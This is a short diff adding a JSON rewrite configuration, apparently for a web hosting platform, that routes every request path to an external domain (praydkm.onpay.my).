@@ -1,0 +1,8 @@
+{
+  "rewrites": [
+    {
+      "source": "/(.*)",
+      "destination": "https://praydkm.onpay.my/$1"
+ }
+  ]
+}
